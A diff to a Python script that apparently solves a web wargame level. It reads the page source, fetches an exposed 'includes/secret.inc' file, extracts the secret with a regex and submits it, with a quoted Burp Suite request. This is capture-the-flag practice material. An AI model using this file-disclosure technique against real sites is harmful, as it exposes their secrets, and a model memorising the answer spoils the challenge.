@@ -25,4 +25,27 @@ response = session.get(URL + 'index-source.html')
 # therefore, we can use html.unescape() to decoded the html file
 source = html.unescape(response.text).replace('<br />', '')
 soup = bs4.BeautifulSoup(source, 'lxml')
-print(soup.find('div').prettify())
+div = soup.find('div').prettify()
+print(f'{div}\n')
+
+
+# as we can see from the source code, specifically from the php code,
+# there is a filepath to includes/secret.inc
+# let's find out the content of the file
+response = session.get(URL + 'includes/secret.inc')
+print(response.text)
+# although the includes directory is properly protected with access control
+# the file secret.inc is accessible
+
+
+"""
+From burpsuite:
+secret=FOEIUWGHFEEUHOFUOIU&submit=Submit+Query
+"""
+regex_search = re.search(r'\$(\w+) = "(\w+)";', response.text)
+data = {
+    regex_search.group(1) : regex_search.group(2),
+    'submit' : 'Submit+Query'
+}
+response = session.post(URL, data=data)
+print(response.text)
